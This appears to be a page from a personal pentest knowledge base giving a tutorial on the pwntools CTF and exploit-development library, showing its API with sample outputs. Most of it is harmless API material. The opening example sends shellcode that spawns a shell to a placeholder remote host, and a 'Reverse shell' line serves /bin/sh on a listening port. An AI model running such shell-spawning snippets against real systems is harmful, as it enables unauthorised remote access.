<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>pwntools</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../index.html">knowledge-based </a></li><li class="spacer"></li><li class="chapter-item affix "><li class="part-title">Knowledges</li><li class="chapter-item "><a href="../../tools/index.html"><strong aria-hidden="true">1.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/android/index.html"><strong aria-hidden="true">1.1.</strong> Android</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/android/adb/index.html"><strong aria-hidden="true">1.1.1.</strong> ADB</a></li><li class="chapter-item "><a href="../../tools/android/apktool/index.html"><strong aria-hidden="true">1.1.2.</strong> APKTool</a></li><li class="chapter-item "><a href="../../tools/android/dex2jar/index.html"><strong aria-hidden="true">1.1.3.</strong> Dex2Jar</a></li><li class="chapter-item "><a href="../../tools/android/devtools_flutter/index.html"><strong aria-hidden="true">1.1.4.</strong> DevTools Flutter</a></li><li class="chapter-item "><a href="../../tools/android/emulator/index.html"><strong aria-hidden="true">1.1.5.</strong> emulator</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/android/emulator/AVDManager/index.html"><strong aria-hidden="true">1.1.5.1.</strong> AVDManager</a></li></ol></li><li class="chapter-item "><a href="../../tools/android/Drozer/index.html"><strong aria-hidden="true">1.1.6.</strong> Drozer</a></li><li class="chapter-item "><a href="../../tools/android/frida/index.html"><strong aria-hidden="true">1.1.7.</strong> Frida</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/android/frida/setup/index.html"><strong aria-hidden="true">1.1.7.1.</strong> Setup</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/android/frida/setup/NotRooted/index.html"><strong aria-hidden="true">1.1.7.1.1.</strong> Setup on not rooted device(s)</a></li><li class="chapter-item "><a href="../../tools/android/frida/setup/emulator/index.html"><strong aria-hidden="true">1.1.7.1.2.</strong> Setup on emulator</a></li><li class="chapter-item "><a href="../../tools/android/frida/setup/AndroidDocker/index.html"><strong aria-hidden="true">1.1.7.1.3.</strong> Setup in Android docker</a></li></ol></li><li class="chapter-item "><a href="../../tools/android/frida/snippets/index.html"><strong aria-hidden="true">1.1.7.2.</strong> Snippets</a></li><li class="chapter-item "><a href="../../tools/android/frida/tutorials/index.html"><strong aria-hidden="true">1.1.7.3.</strong> Tutorials</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/android/frida/tutorials/hacktricks/index.html"><strong aria-hidden="true">1.1.7.3.1.</strong> hacktricks</a></li><li class="chapter-item "><a href="../../tools/android/frida/tutorials/owasp/index.html"><strong aria-hidden="true">1.1.7.3.2.</strong> Owasp</a></li><li class="chapter-item "><a href="../../tools/android/frida/tutorials/BeetleBug/index.html"><strong aria-hidden="true">1.1.7.3.3.</strong> BeetleBug</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../tools/android/r2frida/index.html"><strong aria-hidden="true">1.1.8.</strong> R2Frida</a></li><li class="chapter-item "><a href="../../tools/android/Gnirehtet/index.html"><strong aria-hidden="true">1.1.9.</strong> Gnirehtet</a></li></ol></li><li class="chapter-item "><a href="../../tools/docker/index.html"><strong aria-hidden="true">1.2.</strong> Docker</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/docker/dockerfile/index.html"><strong aria-hidden="true">1.2.1.</strong> Dockerfile</a></li></ol></li><li class="chapter-item "><a href="../../tools/git/index.html"><strong aria-hidden="true">1.3.</strong> Git</a></li><li class="chapter-item "><a href="../../tools/graphviz/index.html"><strong aria-hidden="true">1.4.</strong> GraphViz</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/graphviz/examples/index.html"><strong aria-hidden="true">1.4.1.</strong> Examples</a></li></ol></li><li class="chapter-item "><a href="../../tools/linux/index.html"><strong aria-hidden="true">1.5.</strong> linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../tools/linux/bash/index.html"><strong aria-hidden="true">1.5.1.</strong> bash</a></li><li class="chapter-item "><a href="../../tools/linux/zsh/index.html"><strong aria-hidden="true">1.5.2.</strong> zsh</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../forensics/index.html"><strong aria-hidden="true">2.</strong> Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../forensics/volatility3/index.html"><strong aria-hidden="true">2.1.</strong> volatility3</a></li><li class="chapter-item "><a href="../../forensics/glogg/index.html"><strong aria-hidden="true">2.2.</strong> glogg</a></li><li class="chapter-item "><a href="../../forensics/sleuthkit/index.html"><strong aria-hidden="true">2.3.</strong> sleuthkit</a></li></ol></li><li class="chapter-item "><a href="../../technics/index.html"><strong aria-hidden="true">3.</strong> Technics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../technics/natural-referencing/index.html"><strong aria-hidden="true">3.1.</strong> Natural Referencing</a></li><li class="chapter-item "><a href="../../technics/web-scrapping/index.html"><strong aria-hidden="true">3.2.</strong> Web Scrapping</a></li><li class="chapter-item "><a href="../../technics/wireshark/index.html"><strong aria-hidden="true">3.3.</strong> Wireshark</a></li><li class="chapter-item "><a href="../../technics/nmap/index.html"><strong aria-hidden="true">3.4.</strong> nmap</a></li></ol></li><li class="chapter-item "><a href="../../OSINT/index.html"><strong aria-hidden="true">4.</strong> OSINT</a></li><li class="chapter-item expanded "><a href="../../pentest/index.html"><strong aria-hidden="true">5.</strong> Pentest</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/BinaryExploitation/index.html"><strong aria-hidden="true">5.1.</strong> BinaryExploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/BinaryExploitation/Linux/index.html"><strong aria-hidden="true">5.1.1.</strong> Linux</a></li></ol></li><li class="chapter-item "><a href="../../pentest/useful-commands/index.html"><strong aria-hidden="true">5.2.</strong> Useful Commands</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/useful-commands/ssh/index.html"><strong aria-hidden="true">5.2.1.</strong> ssh</a></li></ol></li><li class="chapter-item "><a href="../../pentest/Metasploit/index.html"><strong aria-hidden="true">5.3.</strong> Netasploit</a></li><li class="chapter-item "><a href="../../pentest/PwdCracking/index.html"><strong aria-hidden="true">5.4.</strong> PwdCracking</a></li><li class="chapter-item "><a href="../../pentest/gdb/index.html"><strong aria-hidden="true">5.5.</strong> GDB</a></li><li class="chapter-item "><a href="../../pentest/BurpSuite/index.html"><strong aria-hidden="true">5.6.</strong> Burp Suite</a></li><li class="chapter-item expanded "><a href="../../pentest/pwntools/index.html" class="active"><strong aria-hidden="true">5.7.</strong> pwntools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/pwntools/cheat_sheet/index.html"><strong aria-hidden="true">5.7.1.</strong> Cheat Sheet</a></li><li class="chapter-item "><a href="../../pentest/pwntools/assembly/index.html"><strong aria-hidden="true">5.7.2.</strong> Assembly</a></li><li class="chapter-item "><a href="../../pentest/pwntools/ROP/index.html"><strong aria-hidden="true">5.7.3.</strong> ROP</a></li><li class="chapter-item "><a href="../../pentest/pwntools/debugging/index.html"><strong aria-hidden="true">5.7.4.</strong> Pwntools Debugging</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/pwntools/debugging/scripts/index.html"><strong aria-hidden="true">5.7.4.1.</strong> Useful scripts</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/pwntools/debugging/scripts/interactive_debugging/index.html"><strong aria-hidden="true">5.7.4.1.1.</strong> Interactive debugging</a></li></ol></li></ol></li></ol></li><li class="chapter-item "><a href="../../pentest/Mobile/index.html"><strong aria-hidden="true">5.8.</strong> Mobile</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/index.html"><strong aria-hidden="true">5.8.1.</strong> red_fox_sec_training</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/web_view/index.html"><strong aria-hidden="true">5.8.1.1.</strong> Exploiting Android WebView Vulnerabilities</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/broad_cast_receivers/index.html"><strong aria-hidden="true">5.8.1.2.</strong> Exploiting Broadcast Receivers</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/content_providers/index.html"><strong aria-hidden="true">5.8.1.3.</strong> Exploiting Content Providers</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/drozer/index.html"><strong aria-hidden="true">5.8.1.4.</strong> Android Pentesting with Drozer</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/tapjacking/index.html"><strong aria-hidden="true">5.8.1.5.</strong> Android Tapjacking Vulnerability</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/crypto/index.html"><strong aria-hidden="true">5.8.1.6.</strong> Broken Cryptography in Android Applications</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/pentest_method/index.html"><strong aria-hidden="true">5.8.1.7.</strong> Android Pentesting Methodology (Pt. 1)</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/pentest_method/index.html"><strong aria-hidden="true">5.8.1.8.</strong> Android Pentesting Methodology (Pt. 2)</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/pentest_method/index.html"><strong aria-hidden="true">5.8.1.9.</strong> Android Pentesting Methodology (Pt. 3)</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/frida/index.html"><strong aria-hidden="true">5.8.1.10.</strong> Android Root Detection Bypass Using Frida</a></li><li class="chapter-item "><a href="../../pentest/Mobile/red_fox_sec_training/frida_ssl_pinning/index.html"><strong aria-hidden="true">5.8.1.11.</strong> SSL Pinning Bypass For Android Using Frida</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../pentest/lab_kali_docker/index.html"><strong aria-hidden="true">5.9.</strong> Lab. Kali Docker</a></li><li class="chapter-item "><a href="../../pentest/Wireshark/index.html"><strong aria-hidden="true">5.10.</strong> Wireshark</a></li><li class="chapter-item "><a href="../../pentest/python_venv/index.html"><strong aria-hidden="true">5.11.</strong> python_venv</a></li></ol></li><li class="chapter-item "><a href="../../dev/index.html"><strong aria-hidden="true">6.</strong> dev</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../dev/python/index.html"><strong aria-hidden="true">6.1.</strong> Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../dev/python/snippets/index.html"><strong aria-hidden="true">6.1.1.</strong> snippets</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../dev/python/snippets/FullClickSnippet/index.html"><strong aria-hidden="true">6.1.1.1.</strong> Full Click Snippets</a></li><li class="chapter-item "><a href="../../dev/python/snippets/GetPostRequest/index.html"><strong aria-hidden="true">6.1.1.2.</strong> Get/Post Request</a></li><li class="chapter-item "><a href="../../dev/python/snippets/MovieToken/index.html"><strong aria-hidden="true">6.1.1.3.</strong> MovieToken</a></li><li class="chapter-item "><a href="../../dev/python/snippets/TcpChallenges/index.html"><strong aria-hidden="true">6.1.1.4.</strong> TCP Challenges</a></li><li class="chapter-item "><a href="../../dev/python/snippets/FlaskGunicorn/index.html"><strong aria-hidden="true">6.1.1.5.</strong> Flask / Gunicorn</a></li><li class="chapter-item "><a href="../../dev/python/snippets/ServerChallenge_pwntool/index.html"><strong aria-hidden="true">6.1.1.6.</strong> Server Chall. with Pwntool</a></li><li class="chapter-item "><a href="../../dev/python/snippets/SolveEquation/index.html"><strong aria-hidden="true">6.1.1.7.</strong> Solve Equation</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../dev/rust/index.html"><strong aria-hidden="true">6.2.</strong> Rust</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../dev/rust/snippets/index.html"><strong aria-hidden="true">6.2.1.</strong> snippets</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../dev/rust/snippets/error/index.html"><strong aria-hidden="true">6.2.1.1.</strong> Error handling</a></li></ol></li><li class="chapter-item "><a href="../../dev/rust/optimization/index.html"><strong aria-hidden="true">6.2.2.</strong> Optimization</a></li></ol></li><li class="chapter-item "><a href="../../dev/Android/index.html"><strong aria-hidden="true">6.3.</strong> Android</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../dev/Android/MinimalProject/index.html"><strong aria-hidden="true">6.3.1.</strong> Minimal Project</a></li></ol></li><li class="chapter-item "><a href="../../dev/IA/index.html"><strong aria-hidden="true">6.4.</strong> IA</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../dev/IA/Ollama_vsCode/index.html"><strong aria-hidden="true">6.4.1.</strong> Ollama_vscode</a></li></ol></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <pre><code> ▄▄▄▄▄▄                        ▄▄▄▄▄▄▄▄                      ▄▄▄▄               
 ██▀▀▀▀█▄                      ▀▀▀██▀▀▀                      ▀▀██               
 ██    ██ ██      ██ ██▄████▄     ██      ▄████▄    ▄████▄     ██      ▄▄█████▄ 
 ██████▀  ▀█  ██  █▀ ██▀   ██     ██     ██▀  ▀██  ██▀  ▀██    ██      ██▄▄▄▄ ▀ 
 ██        ██▄██▄██  ██    ██     ██     ██    ██  ██    ██    ██       ▀▀▀▀██▄ 
 ██        ▀██  ██▀  ██    ██     ██     ▀██▄▄██▀  ▀██▄▄██▀    ██▄▄▄   █▄▄▄▄▄██ 
 ▀▀         ▀▀  ▀▀   ▀▀    ▀▀     ▀▀       ▀▀▀▀      ▀▀▀▀       ▀▀▀▀    ▀▀▀▀▀▀  
</code></pre>
<h2 id="whats-pwntools"><a class="header" href="#whats-pwntools">What's pwntools?</a></h2>
<ul>
<li>CTF framework and exploit development library</li>
<li>make exploit writing as simple as possible</li>
<li>https://pwntools.com &amp; https://docs.pwntools.com</li>
<li>grown from collection of tools by pwnies.dk and Samurai in 2012</li>
</ul>
<pre><code class="language-python">from pwn import *

context(arch = 'i386', os = 'linux')

r = remote('exploitme.example.com', 31337)
# EXPLOIT CODE GOES HERE
r.send(asm(shellcraft.sh()))
r.interactive()
</code></pre>
<h2 id="usage-modes"><a class="header" href="#usage-modes">Usage modes</a></h2>
<table><thead><tr><th>pwn</th><th>pwnlib</th></tr></thead><tbody>
<tr><td>toolbox</td><td>library</td></tr>
<tr><td>changes terminal settings</td><td>does nothing special</td></tr>
<tr><td>parses special CLI arguments</td><td></td></tr>
</tbody></table>
<h2 id="basics-tubes"><a class="header" href="#basics-tubes">Basics: Tubes</a></h2>
<ul>
<li>
<p>Write once, run against everything</p>
</li>
<li>
<p>Common interface for interacting with data</p>
</li>
<li>
<p><code>process</code>, <code>remote</code>, <code>ssh</code>, <code>serialtube</code></p>
</li>
</ul>
<pre><code class="language-python">from pwn import *
io = process(['echo', 'hi'])
io.recvline()
</code></pre>
<pre><code class="language-shell">[x] Starting local process '/usr/bin/echo'
[+] Starting local process '/usr/bin/echo': pid 17261
[*] Process '/usr/bin/echo' stopped with exit code 0 (pid 17261)

b'hi\n'
</code></pre>
<h2 id="basics-receiving"><a class="header" href="#basics-receiving">Basics: Receiving</a></h2>
<pre><code class="language-python">io = process(['ls', '-l', '/'])
io.recvline()
</code></pre>
<pre><code class="language-shell">[x] Starting local process '/usr/bin/ls'
[+] Starting local process '/usr/bin/ls': pid 17262
[*] Process '/usr/bin/ls' stopped with exit code 0 (pid 17262)

b'total 876\n'
</code></pre>
<pre><code class="language-python">io.recvn(10)
</code></pre>
<pre><code class="language-shell">b'drwxr-xr-x'
</code></pre>
<pre><code class="language-python">io.recvuntil(b'bin')
</code></pre>
<pre><code class="language-shell">b'   3 root  root    4096 Mar 14  2023 Docker\nlrwxrwxrwx   1 root  root       7 Apr 23  2020 bin'
</code></pre>
<pre><code class="language-python">io.recvregex(br'\s+([0-9]+)', capture=True).group(1)
</code></pre>
<pre><code class="language-shell">b'2'
</code></pre>
<pre><code class="language-python"># io.recvline().decode()
io.recvlineS()
</code></pre>
<pre><code class="language-shell">' root  root    4096 Apr 23  2020 boot\n'
</code></pre>
<pre><code class="language-python">io.recvpred(lambda p: p.count(b'o') == 2)
</code></pre>
<pre><code>b'drwx------   2 roo'
</code></pre>
<pre><code class="language-python"># unpack(io.recvn(context.bytes))
hex(io.unpack())
</code></pre>
<pre><code class="language-shell">'0x72202074'
</code></pre>
<pre><code class="language-python"># u64(io.recvn(8))
hex(io.u64())
</code></pre>
<pre><code class="language-shell">'0x3420202020746f6f'
</code></pre>
<pre><code class="language-python">io.recvline_startswith(b'lrwxrwxrwx')
</code></pre>
<pre><code class="language-shell">b'lrwxrwxrwx   1 root  root       7 Apr 23  2020 lib -&gt; usr/lib'
</code></pre>
<h2 id="basics-sending"><a class="header" href="#basics-sending">Basics: Sending</a></h2>
<pre><code class="language-python">io = process('cat')
io.send(b'CTF0')
io.recv()
</code></pre>
<pre><code>[x] Starting local process '/usr/bin/cat'
[+] Starting local process '/usr/bin/cat': pid 17263


b'CTF0'
</code></pre>
<pre><code class="language-python">io.sendline(b'thing')
io.recv()
</code></pre>
<pre><code>b'thing\n'
</code></pre>
<pre><code class="language-python">io.newline = b'\r\n'
io.sendline(b'thong')
io.recv()
</code></pre>
<pre><code>b'thong\r\n'
</code></pre>
<h2 id="basics-sending-1"><a class="header" href="#basics-sending-1">Basics: Sending</a></h2>
<pre><code class="language-python">io.send(b'stuff serving as marker')
# recvuntil + send
io.sendafter(b'marker', b'behind marker') # sendlineafter
</code></pre>
<pre><code>b'stuff serving as marker'
</code></pre>
<pre><code class="language-python"># send + recvuntil
io.sendthen(b'back', b'echo back all of this please') # sendlinethen
</code></pre>
<pre><code>b'behind markerecho back'
</code></pre>
<pre><code class="language-python"># io.send(p64(0xdeadf00dcafebabe))
io.p64(0xdeadf00dcafebabe)
</code></pre>
<pre><code class="language-python"># io.send(flat({4: b'hi'}))
io.flat({4: b'hi'})
</code></pre>
<h1 id="remote-interaction"><a class="header" href="#remote-interaction">Remote interaction</a></h1>
<h2 id="connecting-somewhere"><a class="header" href="#connecting-somewhere">Connecting somewhere</a></h2>
<pre><code class="language-python"># TCP
tcp4 = remote('127.0.0.1', 1337)

# UDP
udp4 = remote('127.0.0.1', 1337, typ='udp')

# TLS
tls4 = remote('google.com', 443, ssl=True)

# IPv6
tcp6 = remote('google.com', 80, fam='ipv6')
</code></pre>
<h1 id="remote-interaction-1"><a class="header" href="#remote-interaction-1">Remote interaction</a></h1>
<h2 id="listen-servers"><a class="header" href="#listen-servers">Listen servers</a></h2>
<pre><code class="language-python"># Wait for single connection
client = listen(1337).wait_for_connection()

# Port forwarding
listen(1337).wait_for_connection().connect_both(remote('google.com', 80))

# Reverse shell
listen(1337).spawn_process('/bin/sh')

# Accept multiple connections
s = server(1337)
client = s.next_connection()

# With a prompt
cb = lambda io: io.sendline(b'Welcome!')
s = server(1337, callback=cb)
client = s.next_connection()
</code></pre>
<h1 id="custom-transport-layer"><a class="header" href="#custom-transport-layer">Custom transport layer</a></h1>
<ul>
<li>easy to implement own socket types on top of <code>tube</code></li>
<li>implement <code>recv_raw</code> and <code>send_raw</code></li>
</ul>
<pre><code class="language-python">t = tube()
t.recv_raw = lambda n: b'lots of data'
t.send_raw = lambda d: print(f'{d!r}')

print(t.recvuntil(b'of'))
t.sendline(b'hi')
</code></pre>
<pre><code>b'lots of'
b'hi\n'
</code></pre>
<h1 id="random-helpers"><a class="header" href="#random-helpers">Random helpers</a></h1>
<pre><code class="language-python"># Hex encode / decode
unhex(enhex(b'AAAA')) # bytes.fromhex(b'AAAA'.hex())
</code></pre>
<pre><code>b'AAAA'
</code></pre>
<pre><code class="language-python"># Base64 encode / decode
b64d(b64e(b'BBBB')) # import base64; base64.b64decode(base64.encode(b'BBBB'))
</code></pre>
<pre><code>b'BBBB'
</code></pre>
<pre><code class="language-python"># URL encoding
urlencode('?thing=asd') # urldecode as well
</code></pre>
<pre><code>'%3f%74%68%69%6e%67%3d%61%73%64'
</code></pre>
<pre><code class="language-python">write('./thing', b'important') # open('./thing', 'w').write(b'important')
read('./thing')                # open('./thing', 'rb').read()
</code></pre>
<pre><code>b'important'
</code></pre>
<h1 id="random-helpers-1"><a class="header" href="#random-helpers-1">Random helpers</a></h1>
<pre><code class="language-python"># Evaluate python expression safely
safeeval.expr('1 + 1')
</code></pre>
<pre><code>2
</code></pre>
<pre><code class="language-python"># Evaluate python expression using defined variables
safeeval.values('CTF + 20', {'CTF': 22})
</code></pre>
<pre><code>42
</code></pre>
<pre><code class="language-python"># Random string
randoms(16)
</code></pre>
<pre><code>'xfpmtktypmghasyi'
</code></pre>
<pre><code class="language-python"># XOR multiple things
xor(b'ABCDABCD', 5, b'XYZ')
</code></pre>
<pre><code>b'\x1c\x1e\x1c\x19\x1d\x1d\x1e\x18'
</code></pre>
<h1 id="context"><a class="header" href="#context">Context</a></h1>
<ul>
<li>thread-safe nesting context</li>
<li>controls default values of lots of modules</li>
</ul>
<p>adb, adb_host, adb_port, arch, aslr, binary, bits, buffer_size, bytes, cache_dir, cache_dir_base, cyclic_alphabet, cyclic_size, delete_corefiles, device, endian, gdbinit, kernel, log_console, log_file, log_level, newline, noptrace, os, proxy, quiet, randomize, rename_corefiles, signed, silent, terminal, timeout, verbose</p>
<pre><code class="language-python">context.arch = 'amd64'
context.log_level = 'error'
context.update(arch='amd64', os='linux')
    
# Infer from binary
context.clear()
context.binary = './chall'

with context.quiet:
    log.info('hi')
with context.local(log_level='info'):
    log.debug('ho')
</code></pre>
<pre><code>[*] '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK:    Enabled
    IBT:      Enabled
</code></pre>
<h1 id="context-1"><a class="header" href="#context-1">Context</a></h1>
<ul>
<li>most API accept context settings through kwargs</li>
</ul>
<pre><code class="language-python">print(context.os)
@LocalContext
def myfunc():
    print(context.os)
myfunc(os='windows')
print(context.os)
</code></pre>
<pre><code>linux
windows
linux
</code></pre>
<h1 id="exploit-template"><a class="header" href="#exploit-template">Exploit template</a></h1>
<ul>
<li>Generate exploit boilerplate code</li>
<li>Switch between remote and local target
<ul>
<li><code>./doit.py</code></li>
<li><code>./doit.py LOCAL</code></li>
</ul>
</li>
<li>Start a debug session
<ul>
<li><code>./doit.py LOCAL GDB</code></li>
</ul>
</li>
</ul>
<p><code>pwn template --host the.c.tf --port 1337 ./chall &gt; doit.py</code></p>
<ul>
<li><strong>new</strong>: omit <code>./chall</code> for auto-detection</li>
</ul>
<p><code>pwn template --host the.c.tf --port 1337 --libc libc.so.6 ./chall &gt; doit.py</code></p>
<h1 id="running-the-exploit"><a class="header" href="#running-the-exploit">Running the exploit</a></h1>
<ul>
<li>Control <code>context</code> through arguments:
<ul>
<li><code>./doit.py NOASLR LOG_LEVEL=error</code></li>
</ul>
</li>
<li>Control <code>context</code> through environment variables:
<ul>
<li><code>PWNLIB_NOASLR=1 PWNLIB_LOG_LEVEL=error ./exploit.py</code></li>
</ul>
</li>
<li>Access uppercase arguments through <code>args</code>
<ul>
<li><code>./doit.py TEAM=ctf0</code> -&gt; <code>args.TEAM == 'ctf0'</code></li>
</ul>
</li>
<li>Control logging
<ul>
<li><code>doit.py LOG_LEVEL=warn</code> -&gt; <code>context.log_level = 'warn'</code></li>
<li><code>doit.py DEBUG</code> -&gt; <code>context.log_level = 'debug'</code></li>
<li><code>doit.py SILENT</code> -&gt; <code>context.log_level = 'error'</code></li>
<li><code>doit.py STDERR</code> -&gt; sends logging to stderr instead of stdout</li>
<li><code>doit.py LOG_FILE=./log.txt</code> -&gt; write log to file</li>
</ul>
</li>
<li>Run with local system libc
<ul>
<li><code>./doit.py LOCAL LOCAL_LIBC</code></li>
</ul>
</li>
</ul>
<h1 id="elf"><a class="header" href="#elf">ELF</a></h1>
<pre><code class="language-python">exe = ELF('./chall')
</code></pre>
<pre><code class="language-python">hex(exe.sym.main) # exe.symbols['main']
</code></pre>
<pre><code>'0x401210'
</code></pre>
<pre><code class="language-python">exe.address = 0x99000000
hex(exe.sym.main)
</code></pre>
<pre><code>'0x99001210'
</code></pre>
<pre><code class="language-python">
io = exe.process()
io.close()
